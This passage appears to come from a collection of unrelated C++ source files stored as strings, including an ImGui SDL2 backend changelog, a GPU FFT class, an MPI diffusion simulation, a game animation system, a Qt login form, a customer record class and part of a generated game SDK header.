ImGuiConfigFlags_ViewportsEnable'.\r\n// Issues:\r\n//  [ ] Platform: Multi-viewport: Minimized windows seems to break mouse wheel events (at least under Windows).\r\n//  [ ] Platform: Multi-viewport: ParentViewportID not honored, and so io.ConfigViewportsNoDefaultParent has no effect (minor).\r\n//  [x] Platform: Basic IME support. App needs to call 'SDL_SetHint(SDL_HINT_IME_SHOW_UI, \"1\");' before SDL_CreateWindow()!.\r\n\r\n// You can use unmodified imgui_impl_* files in your project. See examples/ folder for examples of using this.\r\n// Prefer including the entire imgui/ repository into your project (either as a copy or as a submodule), and only build the backends you need.\r\n// Learn about Dear ImGui:\r\n// - FAQ                  https://dearimgui.com/faq\r\n// - Getting Started      https://dearimgui.com/getting-started\r\n// - Documentation        https://dearimgui.com/docs (same as your local docs/ folder).\r\n// - Introduction, links and more at the top of imgui.cpp\r\n\r\n// CHANGELOG\r\n// (minor and older changes stripped away, please see git history for details)\r\n//  2024-XX-XX: Platform: Added support for multiple windows via the ImGuiPlatformIO interface.\r\n//  2024-09-09: use SDL_Vulkan_GetDrawableSize() when available. (#7967, #3190)\r\n//  2024-08-22: moved some OS/backend related function pointers from ImGuiIO to ImGuiPlatformIO:\r\n//               - io.GetClipboardTextFn    -> platform_io.Platform_GetClipboardTextFn\r\n//               - io.SetClipboardTextFn    -> platform_io.Platform_SetClipboardTextFn\r\n//               - io.PlatformOpenInShellFn -> platform_io.Platform_OpenInShellFn\r\n//               - io.PlatformSetImeDataFn  -> platform_io.Platform_SetImeDataFn\r\n//  2024-08-19: Storing SDL's Uint32 WindowID inside ImGuiViewport::PlatformHandle instead of SDL_Window*.\r\n//  2024-08-19: ImGui_ImplSDL2_ProcessEvent() now ignores events intended for other SDL windows. (#7853)\r\n//  2024-07-02: Emscripten: Added io.PlatformOpenInShellFn() handler for Emscripten versions.\r\n//  2024-07-02: Update for io.SetPlatformImeDataFn() -> io.PlatformSetImeDataFn() renaming in main library.\r\n//  2024-02-14: Inputs: Handle gamepad disconnection. Added ImGui_ImplSDL2_SetGamepadMode().\r\n//  2023-10-05: Inputs: Added support for extra ImGuiKey values: F13 to F24 function keys, app back/forward keys.\r\n//  2023-04-06: Inputs: Avoid calling SDL_StartTextInput()/SDL_StopTextInput() as they don't only pertain to IME. It's unclear exactly what their relation is to IME. (#6306)\r\n//  2023-04-04: Inputs: Added support for io.AddMouseSourceEvent() to discriminate ImGuiMouseSource_Mouse/ImGuiMouseSource_TouchScreen. (#2702)\r\n//  2023-02-23: Accept SDL_GetPerformanceCounter() not returning a monotonically increasing value. (#6189, #6114, #3644)\r\n//  2023-02-07: Implement IME handler (io.SetPlatformImeDataFn will call SDL_SetTextInputRect()/SDL_StartTextInput()).\r\n//  2023-02-07: *BREAKING CHANGE* Renamed this backend file from imgui_impl_sdl.cpp/.h to imgui_impl_sdl2.cpp/.h in prevision for the future release of SDL3.\r\n//  2023-02-02: Avoid calling SDL_SetCursor() when cursor has not changed, as the function is surprisingly costly on Mac with latest SDL (may be fixed in next SDL version).\r\n//  2023-02-02: Added support for SDL 2.0.18+ preciseX/preciseY mouse wheel data for smooth scrolling + Scaling X value on Emscripten (bug?). (#4019, #6096)\r\n//  2023-02-02: Removed SDL_MOUSEWHEEL value clamping, as values seem correct in latest Emscripten. (#4019)\r\n//  2023-02-01: Flipping SDL_MOUSEWHEEL 'wheel.x' value to match other backends and offer consistent horizontal scrolling direction. (#4019, #6096, #1463)\r\n//  2022-10-11: Using 'nullptr' instead of 'NULL' as per our switch to C++11.\r\n//  2022-09-26: Inputs: Disable SDL 2.0.22 new \"auto capture\" (SDL_HINT_MOUSE_AUTO_CAPTURE) which prevents drag and drop across windows for multi-viewport support + don't capture when drag and dropping. (#5710)\r\n//  2022-09-26: Inputs: Renamed ImGuiKey_ModXXX introd",
    "#include \"FastFourierTransform/FastFourierTransform.h\"\n#include \"ProgramSourcePaths.h\"\nusing namespace shader_directory;\n\n\nFFFT::FFFT(const std::vector<std::pair<std::string, std::string>>& ffft_preprocessing_defines)\n{\n\tcompile_shaders(ffft_preprocessing_defines);\n}\n\nvoid FFFT::compile_shaders(const std::vector<std::pair<std::string, std::string>>& ffft_preprocessing_defines)\n{\n\tcp_reverse_bit_swap\t\t\t\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"reverse_bit_swap.comp\"), ffft_preprocessing_defines);\n\tcp_fft_single_pass_complex_complex\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"fft_single_step_complex_complex.comp\"), ffft_preprocessing_defines);\n\tcp_shift\t\t\t\t\t\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"fft_shift.comp\"), ffft_preprocessing_defines);\n\n\tcp_blit_texture_complex_to_complex\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"blit_texture_complex_to_complex.comp\"), ffft_preprocessing_defines);\n\tcp_blit_texture_real_to_complex\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"blit_texture_real_to_complex.comp\"), ffft_preprocessing_defines);\n\tcp_blit_texture_complex_to_real_r\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"blit_texture_complex_to_real_r.comp\"), ffft_preprocessing_defines);\n\tcp_blit_texture_complex_to_real_i\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"blit_texture_complex_to_real_i.comp\"), ffft_preprocessing_defines);\n\n\tcp_conjugate_texture\t\t\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"conjugate_texture.comp\"), ffft_preprocessing_defines);\n\tcp_multiply_complex_texture\t\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"multiply_complex_texture.comp\"), ffft_preprocessing_defines);\n\tcp_divide_complex_texture\t\t\t= std::make_shared<ComputeProgram>(Shader(ffft_shader_directory + \"divide_complex_texture.comp\"), ffft_preprocessing_defines);\n\n}\n\nvoid FFFT::set_axis(Axis axis)\n{\n\t_axis = axis;\n}\n\nFFFT::Axis FFFT::get_axis()\n{\n\treturn _axis;\n}\n\nvoid FFFT::fft_radix2(Texture2D& complex_texture)\n{\n\treverse_bit_swap(complex_texture);\n\n\tint size = _axis == HORIZONTAL ? complex_texture.get_size().x : complex_texture.get_size().y;\n\tint log2_size = floor_log2(size);\n\n\tif (1U << log2_size != size) {\n\t\tif (_axis == HORIZONTAL)\n\t\t\tstd::cout << \"[CTReconstructor Error] FFFT::fft_radix2() is called but texture's width is not a power of 2\" << std::endl;\n\t\tif (_axis == VERTICAL)\n\t\t\tstd::cout << \"[CTReconstructor Error] FFFT::fft_radix2() is called but texture's height is not a power of 2\" << std::endl;\n\n\t\tASSERT(false);\n\t}\n\n\tstd::shared_ptr<Texture2D> complex_texture_copy = complex_texture.create_texture_with_same_parameters();\n\tblit_texture_complex_to_complex(complex_texture, *complex_texture_copy);\n\n\tfor (int i = 0; i < log2_size; i++) {\n\t\t// swap the read and write buffers every iteration to avoid race-condition and unnecessary copying\n\t\tTexture2D& texture_to_read  = i % 2 == 0 ? complex_texture : *complex_texture_copy;\n\t\tTexture2D& texture_to_write = i % 2 == 0 ? *complex_texture_copy : complex_texture;\n\n\t\tfft_single_step(texture_to_read, texture_to_write, i);\n\t}\n\n\tif ((log2_size - 1) % 2 == 0)\n\t\tblit_texture_complex_to_complex(*complex_texture_copy, complex_texture);\n}\n\nvoid FFFT::inverse_fft_radix2(Texture2D& complex_texture)\n{\n\tconjugate_complex_texture(complex_texture);\n\tfft_radix2(complex_texture);\n\tconjugate_complex_texture(complex_texture);\n\tdivide_complex_texture(complex_texture, (float)complex_texture.get_size().x);\n}\n\nvoid FFFT::fft(Texture2D& source_complex_texture, Texture2D& target_fourier_texture)\n{\n\tint size = _axis == HORIZONTAL ? source_complex_texture.get_size().x : source_complex_texture.get_size().y;\n\tint logsize = 1 << ceil_log2(size);\n\n\tif (_axis == HORIZONTAL && target_fourier_texture.get_size().x != logsize) {\n\t\tstd::cout << \"[CTReconstructor Error] FFFT::fft(Texture2D& source_complex_texture, Texture2D& target_fourier_texture) was called but target_fourier_texture's x dimention is not radix-2, it had to be \" << logsize << std::endl;\n\t\tASSERT(false);\n\t}\n\tif (_axis == VERTICAL && target_fourier_texture.get_size().y != logsize) {\n\t\tstd::cout << \"[CTReconstructor Error] FFFT::fft(Texture2D& source_complex_texture, Texture2D& target_fourier_texture) was called but target_fourier_texture's y dimention is not radix-2, it had to be \" << logsize << std::endl;\n\t\tASSERT(false);\n\t}\n\n\n\ttarget_fourier_texture.clear(glm::vec2(0, 0), 0);\n\tblit_texture_complex_to_complex(source_complex_texture, target_fourier_texture);\n\t\n\tfft_radix2(target_fourier_texture);\n}\n\nstd::shared_ptr<Texture2D> FFFT::fft(Texture2D& source_complex_texture)\n{\n\tint size = _axis == HORIZONTAL ? source_complex_texture.get_size().x : source_complex_texture.get_size().y;\n\tint logsize = 1 << ceil_log2(size);\n\n\tstd::shared_ptr<Texture2D> target_fourier_texture = create_padded_complex_texture(source_complex_texture);\n\n\tfft(source_complex_texture, ",
    "#include <iostream>\r\n#include <vector>\r\n#include <mpi.h>\r\n\r\n#define SIZE 1000\t\t\t\t// Grid size (1000x1000)\r\n#define STEPS 100\t\t\t\t// Number of simulation steps\r\n#define DIFFUSION_COEFF 0.1\t\t// Diffusion coefficient\r\n#define DT 0.01\t\t\t\t\t// Time step\r\n\r\nusing namespace std;\r\n\r\ntypedef vector<vector<double>> Matrix;\r\n\r\n// Initialize the grid with some initial conditions (e.g., a concentration source in the middle)\r\nvoid initialize(Matrix& grid, int rank, int rows_per_process) {\r\n\tint global_mid = SIZE / 2;\r\n\tint local_mid = global_mid - rank * rows_per_process;\r\n\r\n\tif (local_mid >= 0 && local_mid < rows_per_process) {\r\n\t\tgrid[local_mid][SIZE / 2] = 100.0;\t// Initial concentration at the center\r\n\t}\r\n\r\n}\r\n\r\n// // Display the grid (for small grid sizes only, not practical for large grids)\r\nvoid display(const Matrix& grid) {\r\n\tfor (int i = 0; i < grid.size(); ++i) {\r\n\t\tfor (int j = 0; j < grid[i].size(); ++j) {\r\n\t\t\tcout << grid[i][j] << \" \";\r\n\t\t}\r\n\t\tcout << endl;\r\n\t}\r\n\tcout << endl;\r\n}\r\n\r\n// Perform one step of the similation (calculate the new velocities)\r\nvoid step(const Matrix& current, Matrix& next, int rank, int size) {\r\n\tint rows_per_process = current.size();\r\n\r\n\tfor (int i = 1; i < rows_per_process - 1; ++i) {\r\n\t\tfor (int j = 1; j < SIZE - 1; ++j) {\r\n\t\t\tnext[i][j] = current[i][j] + DIFFUSION_COEFF * DT * (\r\n\t\t\t\tcurrent[i + 1][j] + current[i - 1][j] +\r\n\t\t\t\tcurrent[i][j + 1] + current[i][j - 1] - 4 * current[i][j]\r\n\t\t\t\t);\r\n\t\t}\r\n\t}\r\n\r\n\t// Exchange boundary rows with neighboring processes\r\n\tif (rank > 0) {\r\n\t\t// Send top boundary row to process above\r\n\t\tMPI_Send(current[1].data(), SIZE, MPI_DOUBLE, rank - 1, 0, MPI_COMM_WORLD);\r\n\t\t// Receive bottom boundary row from the process above\r\n\t\tMPI_Recv(current[0].data(), SIZE, MPI_DOUBLE, rank - 1, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\r\n\t}\r\n\r\n\tif (rank < size - 1) {\r\n\t\t// Send bottom boundary row to process below\r\n\t\tMPI_Send(current[rows_per_process - 2].data(), SIZE, MPI_DOUBLE, rank + 1, 0, MPI_COMM_WORLD);\r\n\t\t// Send top boundary row from the process below\r\n\t\tMPI_Recv(current[rows_per_process - 1].data(), SIZE, MPI_DOUBLE, rank + 1, 0, MPI_COMM_WORLD, MPI_STATUS_IGNORE);\r\n\t}\r\n\r\n}\r\n\r\n// Run the simulation for a certain number of steps\r\nvoid run_simulation(Matrix& grid, int rank, int size) {\r\n\tint rows_per_process = grid.size();\r\n\tMatrix next_grid = grid;\r\n\r\n\tfor (int step_count = 0; step_count < STEPS; ++step_count) {\r\n\t\tstep(grid, next_grid, rank, size);\r\n\t\tgrid.swap(next_grid);\t// Swap grids for the next iteration\r\n\t\tif (rank == 0 && step_count % 10 == 0) {\r\n\t\t\tcout << \"Completed step: \" << step_count << endl;\r\n\t\t}\r\n\t}\r\n}\r\n\r\n\r\nint main(int argc, char** argv) {\r\n\tMPI_Init(&argc, &argv);\r\n\r\n\tint rank, size;\r\n\r\n\tMPI_Comm_rank(MPI_COMM_WORLD, &rank);\r\n\tMPI_Comm_size(MPI_COMM_WORLD, &size);\r\n\r\n\t// Divide the grid into chunks for each process\r\n\tint rows_per_process = SIZE / size + 2;\t\t// Add 2 extra rows for the boundary exchange\r\n\tMatrix grid(rows_per_process, vector<double>(SIZE, 0.0));\r\n\r\n\t// Initialize the grid\r\n\tinitialize(grid, rank, rows_per_process);\r\n\r\n\t// Run the simulation\r\n\tdouble start_time = MPI_Wtime();\r\n\trun_simulation(grid, rank, size);\r\n\tdouble end_time = MPI_Wtime();\r\n\r\n\t// Display final results (optional for smaill grids)\r\n\t// If (rank == 0) display(grid);\r\n\r\n\tif (rank == 0) {\r\n\t\tcout << \"Simulation completed in \" << (end_time - start_time) << \" seconds.\" << endl;\r\n\t}\r\n\r\n\tMPI_Finalize();\r\n\treturn 0;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n",
    "/*\n** EPITECH PROJECT, 2024\n** R-Type\n** File description:\n** animation_system\n*/\n\n#include \"animation_system.hpp\"\n#include <chrono>\n\nnamespace ecs::systems {\n\n    void AnimationSystem::update(Registry& registry, float deltaTime, sf::RenderWindow& window) {\n        auto &animations = registry.get_components<Animation>();\n\n        for (std::size_t i = 0; i < animations.size(); ++i) {\n            if (animations[i]) {\n                auto &animation = *animations[i];\n\n                _time += deltaTime;\n                if (_time >= _switchTime) {\n                    _time -= _switchTime;\n                    animation.currentImage.x++;\n                    if (animation.currentImage.x >= animation.imageCount.x) {\n                        animation.currentImage.x = 0;\n                        animation.currentImage.y++;\n                        if (animation.currentImage.y >= animation.imageCount.y) {\n                            animation.currentImage.y = 0;\n                        }\n                    }\n                }\n                setTextureRect(animation.sprite, animation.currentImage.x * animation.imageSize.x,\n                               animation.currentImage.y * animation.imageSize.y, animation.imageSize.x,\n                               animation.imageSize.y);\n                draw(window, animation.sprite);\n            }\n        }\n    }\n\n    void AnimationSystem::setPos(sf::Sprite &sprite, float x, float y) {\n        sprite.setPosition(x, y);\n    }\n\n    void AnimationSystem::setTexture(sf::Sprite &sprite, sf::Texture &texture) {\n        sprite.setTexture(texture);\n    }\n\n    void AnimationSystem::setScale(sf::Sprite &sprite, float x, float y) {\n        sprite.setScale(x, y);\n    }\n\n    void AnimationSystem::setOrigin(sf::Sprite &sprite, float x, float y) {\n        sprite.setOrigin(x, y);\n    }\n\n    void AnimationSystem::setRotation(sf::Sprite &sprite, float angle) {\n        sprite.setRotation(angle);\n    }\n\n    void AnimationSystem::setTextureRect(sf::Sprite &sprite, int x, int y, int width, int height) {\n        sprite.setTextureRect(sf::IntRect(x, y, width, height));\n    }\n\n    void AnimationSystem::draw(sf::RenderWindow& window, sf::Sprite &sprite) {\n        window.draw(sprite);\n    }\n\n}",
    "#include <iostream>\r\n#include <string>\r\n\r\n#include \"Utils.h\"\r\n#include \"Demos.h\"\r\n\r\nusing namespace std;\r\n\r\n//#define STANDARD_IO\r\n//#define STRINGS\r\n\r\nint main (int argc, char *argv[]) {\r\n#ifdef STANDARD_IO\r\n\t// cout -- The Standard Output Stream\r\n\tcout << \"Hello from cout\" << endl;\r\n\t// cerr -- The Standard Output Stream for errors\r\n\tcerr << \"Hello from cerr\" << endl;\r\n\t// cin  -- The Standard Input Stream\r\n\tint x;\r\n\tcout << \"Write an int: \";\r\n\tcin >> x;\r\n\tcout << \"You typed: \" << x << endl;\r\n\r\n\tcout << \"Give 2 int values and 1 double: \";\r\n\t// TODO: Write the code and print the values\r\n\tint a, b; double d;\r\n\tcin >> a >> b >> d;\r\n\tcout << \"a: \" << a << \" | b: \" << b << \" | d: \" << d << endl;\r\n\t\r\n\tcout << \"Give text: \";\r\n\t// TODO: Get text from input and print it\r\n\tstring text;\r\n\tcin >> text;\r\n\tcout << \"T: \" << text << endl;\r\n\r\n\tcout << \"Write a line ::\\n\";\r\n\tchar buf[256];\r\n\tcin.ignore();\t// Used to skip the \\n (Enter) pressed by the user in the previous input\r\n\tcin.getline(buf,256);\r\n\tcout << \"You typed :: \" << buf << endl;\r\n\tstring line;\r\n\tcout << \"Write a line again ::\\n\";\r\n\tgetline(cin,line);\r\n\tcout << \"You typed :: \" << line << endl;\r\n\tsystem(\"PAUSE\");\r\n#elif defined STRINGS\r\n\tstring_examples();\r\n\tsystem(\"PAUSE\");\r\n#else\r\n\tif (argc != 2) {\r\n\t\tcout << \"Usage: Missing input_file\" << endl;\r\n\t\tsystem(\"PAUSE\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n\t// Data Structures\r\n\tvector <std::string> vNamesList;\r\n\t\r\n\r\n\tif (!readInputFile (argv[1], vNamesList)) {\r\n\t\tsystem(\"PAUSE\");\r\n\t\treturn -1;\r\n\t}\r\n\r\n\t// Now print the strings contained in Vector\r\n\tprintStringVector(vNamesList);\r\n\t// Now print the strings contained in Set\r\n\tsystem(\"PAUSE\");\r\n\t\r\n#endif\r\n\r\n\treturn 0;\r\n}",
    "#include \"connect.h\"\r\n#include \"generalwindow.h\"\r\n#include <QApplication>\r\n#include <QWindow>\r\n#include \"mainwindow.h\"\r\n\r\nStartWindow::StartWindow(MainWindow *window) : registration(window){\r\n\r\n    setWindowTitle(\"\u041e\u043a\u043d\u043e \u0432\u0445\u043e\u0434\u0430\");\r\n    setFixedSize(300, 200);\r\n    QApplication::setStyle(\"Fusion\");\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(this);\r\n\r\n    usernameEdit = new QLineEdit(this);\r\n    usernameEdit->setPlaceholderText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\");\r\n    usernameEdit->resize(170, 30);\r\n\r\n    emailEdit = new QLineEdit(this);\r\n    emailEdit->setPlaceholderText((\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 email\"));\r\n    emailEdit->resize(170, 30);\r\n\r\n    passwordEdit = new QLineEdit(this);\r\n    passwordEdit->setPlaceholderText(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u044c\");\r\n    passwordEdit->setEchoMode(QLineEdit::Password);\r\n    passwordEdit->resize(170, 30);\r\n\r\n    QPushButton *registerButton = new QPushButton(\"\u0412\u043e\u0439\u0442\u0438\", this);\r\n\r\n    //\u0420\u0430\u0437\u043c\u0435\u0449\u0435\u043d\u0438\u0435\r\n    usernameEdit->move(70,50);\r\n    emailEdit->move(70,90);\r\n    passwordEdit->move(70,130);\r\n    registerButton->move(100,170);\r\n\r\n    layout->addWidget(usernameEdit);\r\n    layout->addWidget(emailEdit);\r\n    layout->addWidget(passwordEdit);\r\n    layout->addWidget(registerButton);\r\n\r\n    setLayout(layout);\r\n\r\n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c \u043a\u043d\u043e\u043f\u043a\u0443 \u043a \u0441\u043b\u043e\u0442\u0443\r\n    connect(registerButton, &QPushButton::clicked, this, &StartWindow::onStartClicked);\r\n}\r\n\r\nvoid StartWindow::onStartClicked() {\r\n    // \u041f\u043e\u043b\u0443\u0447\u0430\u0435\u043c \u0432\u0432\u0435\u0434\u0435\u043d\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\r\n    QString username = usernameEdit->text();\r\n    QString email = emailEdit->text();\r\n    QString password = passwordEdit->text();\r\n\r\n    // \u041f\u043e\u0434\u043a\u043b\u044e\u0447\u0430\u0435\u043c\u0441\u044f \u043a \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    QSqlDatabase db = QSqlDatabase::database(\"qt_sql_default_connection\");\r\n    if (!db.isOpen()) {\r\n        db = QSqlDatabase::addDatabase(\"QSQLITE\");\r\n        db.setDatabaseName(\"C:/Users/Dmitry/users.db\");\r\n\r\n        if (!db.open()) {\r\n            qDebug() << \"Error opening database:\" << db.lastError().text();\r\n            return;\r\n        }\r\n    }\r\n\r\n    // \u0412\u044b\u0432\u043e\u0434 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u0438 \u043e \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    qDebug() << \"Database name:\" << db.databaseName();\r\n    qDebug() << \"Is database open?\" << db.isOpen();\r\n\r\n    // \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043d\u0430\u043b\u0438\u0447\u0438\u0435 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f \u0432 \u0431\u0430\u0437\u0435 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    QSqlQuery query;\r\n    query.prepare(\"SELECT name, email, password FROM users WHERE name = :name AND email = :email AND password = :password;\");\r\n    query.bindValue(\":name\", username);\r\n    query.bindValue(\":email\", email);\r\n    query.bindValue(\":password\", password);\r\n    query.exec();\r\n\r\n    if (!query.exec()) {\r\n        QMessageBox::warning(this, \"\u041e\u0448\u0438\u0431\u043a\u0430\", \"\u041e\u0448\u0438\u0431\u043a\u0430 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f \u0437\u0430\u043f\u0440\u043e\u0441\u0430: \" + query.lastError().text());\r\n        return;\r\n    }\r\n\r\n    if (query.next()) {\r\n        // \u0415\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0430\u0439\u0434\u0435\u043d, \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0430\u0435\u043c\r\n        QMessageBox::information(this, \"\u0412\u0445\u043e\u0434\", \"\u0412\u0445\u043e\u0434 \u0443\u0441\u043f\u0435\u0448\u0435\u043d!\");\r\n\r\n        // \u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043e\u043a\u043d\u043e MainWindow, \u0435\u0441\u043b\u0438 \u043e\u043d\u043e \u043e\u0442\u043a\u0440\u044b\u0442\u043e\r\n        if (registration) {\r\n            registration->close();\r\n        }\r\n\r\n        QString username = query.value(\"name\").toString();\r\n\r\n        // \u041e\u0442\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u043d\u043e\u0432\u043e\u0435 \u043e\u043a\u043d\u043e\r\n        GeneralWindow *generalWindow = new GeneralWindow(username);\r\n\r\n        generalWindow->show();\r\n\r\n        // \u0417\u0430\u043a\u0440\u044b\u0432\u0430\u0435\u043c \u0442\u0435\u043a\u0443\u0449\u0435\u0435 \u043e\u043a\u043d\u043e\r\n        this->close();\r\n    }\r\n    else {\r\n        // \u0415\u0441\u043b\u0438 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d, \u0432\u044b\u0432\u043e\u0434\u0438\u043c \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435 \u043e\u0431 \u043e\u0448\u0438\u0431\u043a\u0435\r\n        QMessageBox::warning(this, \"\u041e\u0448\u0438\u0431\u043a\u0430\", \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e\u0435 \u0438\u043c\u044f \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f, email \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c.\");\r\n    }\r\n}\r\n",
    "//\n// Created by Nguy\u00ean Nguy\u1ec5n on 9/15/23.\n//\n#include \"customer.h\"\n#include \"date.h\"\n#include <sstream>\nusing namespace std;\nCustomerCompareOptions Customer::option;\nCustomer::Customer() {\n    this->customer_id=\"\";\n    this->username=\"\";\n    this->first_name=\"\";\n    this->last_name=\"\";\n    this->street_address=\"\";\n    this->city=\"\";\n    this->state=\"\";\n    this->postal_code=\"\";\n    this->email_address=\"\";\n    this->gender=\"\";\n    this->company=\"\";\n    this->job_title=\"\";\n    this->customer_since = Date();\n    this->social_security_number=\"\";\n    this->date_of_birth=Date();\n    this->household_income=0;\n    this->credit_score=0;\n    this->total_sales=0;\n}\nCustomer::Customer(string customer_id, string username, string first_name, string last_name, string street_address,\n                   string city, string state, string postal_code, string email_address, string gender, string company, string job_title,\n                   Date customer_since, string social_security_number, Date date_of_birth, int household_income,\n                   int credit_score, double total_sales) {\n    this->customer_id=customer_id;\n    this->username=username;\n    this->first_name=first_name;\n    this->last_name=last_name;\n    this->street_address=street_address;\n    this->city=city;\n    this->state=state;\n    this->postal_code=postal_code;\n    this->email_address=email_address;\n    this->gender=gender;\n    this->company=company;\n    this->job_title=job_title;\n    this->customer_since=customer_since;\n    this->social_security_number=social_security_number;\n    this->date_of_birth=date_of_birth;\n    this->household_income=household_income;\n    this->credit_score=credit_score;\n    this->total_sales=total_sales;\n}\nCustomer::Customer(string record)\n{\n    istringstream line(record);\n    getline(line,this->customer_id,'\\t');\n    getline(line,this->username,'\\t');\n    getline(line,this->first_name,'\\t');\n    getline(line,this->last_name,'\\t');\n    getline(line,this->street_address,'\\t');\n    getline(line,this->city,'\\t');\n    getline(line,this->state,'\\t');\n    getline(line,this->postal_code,'\\t');\n    getline(line,this->email_address,'\\t');\n    getline(line,this->gender,'\\t');\n    getline(line,this->company,'\\t');\n    getline(line,this->job_title,'\\t');\n    string date_since;\n    getline(line,date_since,'\\t');\n    Date since(date_since);\n    this->customer_since=since;\n    getline(line,this->social_security_number,'\\t');\n    string birthday;\n    getline(line,birthday,'\\t');\n    Date birth(birthday);\n    this->date_of_birth=birth;\n    string household;\n    getline(line,household,'\\t');\n    this->household_income=stoi(household);\n    string credit;\n    getline(line,credit,'\\t');\n    this->credit_score=stoi(credit);\n    string sales;\n    getline(line,sales);\n    this->total_sales=stod(sales);\n}\nvoid Customer::setUserName(string userName) {\n    username=userName;\n}\nstring Customer::getUserName() const\n{\n    return username;\n}\nstring Customer::getFirstName() const {\n    return first_name;\n}\n\nvoid Customer::setFirstName(string firstName) {\n    first_name=firstName;\n}\n\nstring Customer::getLastName() const {\n    return last_name;\n}\nvoid Customer::setLastName(string lastName) {\n    last_name=lastName;\n}\n\nstring Customer::getStreetAddress() const {\n    return street_address;\n}\nvoid Customer::setStreetAddress(string streetAddress) {\n    street_address=streetAddress;\n}\n\nstring Customer::getCity() const {\n    return city;\n}\nvoid Customer::setCity(string city) {\n    this->city=city;\n}\n\nstring Customer::getState() const {\n    return state;\n}\n\nvoid Customer::setState(string state) {\n    this->state=state;\n}\nstring Customer::getZip() const {\n    return postal_code;\n}\n\nvoid Customer::setZip(string zip) {\n    postal_code=zip;\n}\n\nstring Customer::getEmail() const {\n    return email_address;\n}\n\nvoid Customer::setEmail(string email) {\n    email_address=email;\n}\n\nstring Customer::getGender() const {\n    return gender;\n}\n\nvoid Customer::setGender(string gender) {\n    this->gender=gender;\n}\n\nstring Customer::getCompany() const {\n    return company;\n}\n\nvoid Customer::setCompany(string company) {\n    this->company=company;\n}\n\nstring Customer::getJobTitle() const {\n    return job_title;\n}\n\nvoid Customer::setJobTitle(string jobTitle) {\n    job_title=jobTitle;\n}\nDate Customer::getCustomerSince() const {\n    return customer_since;\n}\nvoid Customer::setCustomerSince(Date customerSince) {\n   customer_since=customerSince;\n}\n\nDate Customer::getDateOfBirth() const {\n    return date_of_birth;\n}\nvoid Customer::setDateOfBirth(Date dateOfBirth) {\n    date_of_birth=dateOfBirth;\n}\n\nint Customer::getHouseholdIncome() const {\n    return household_income;\n}\n\nvoid Customer::setHouseholdIncome(int householdIncome) {\n    household_income=householdIncome;\n}\n\nint Customer::getCreditScore() const {\n    return credit_score;\n}\n\nvoid Customer::setCreditScore(int creditScore) {\n    credit_score=creditScore;\n}\ndouble Customer::getTotalSales() const {\n    return total_sales;\n}\nvoid Customer::set",
    "#pragma once\n\n/*\n* SDK generated by Dumper-7\n*\n* https://github.com/Encryqed/Dumper-7\n*/\n\n// Package: BUF_MagLevGrab_Base\n\n#include \"Basic.hpp\"\n\n#include \"BUF_MagLevGrab_Base_classes.hpp\"\n#include \"BUF_MagLevGrab_Base_parameters.hpp\"\n\n\nnamespace SDK\n{\n\n// Function BUF_MagLevGrab_Base.BUF_MagLevGrab_Base_C.OnCharacterMontageStart\n// (Event, Public, BlueprintCallable, BlueprintEvent, Const)\n// Parameters:\n// class AMatchaSnapNetCharacterEntity*    BuffedCharacter                                        (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, NoDestructor, HasGetValueTypeHash)\n// float                                   MontageDuration                                        (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// EMatchaCharacterMontageType             MontageType                                            (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// EMatchaCharacterMontageType             PreviousMontageType                                    (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n// EObjectRarity                           BuffRarity                                             (BlueprintVisible, BlueprintReadOnly, Parm, ZeroConstructor, IsPlainOldData, NoDestructor, HasGetValueTypeHash)\n\nvoid UBUF_MagLevGrab_Base_C::OnCharacterMontageStart(class AMatchaSnapNetCharacterEntity* BuffedCharacter, float MontageDuration, EMatchaCharacterMontageType MontageType, 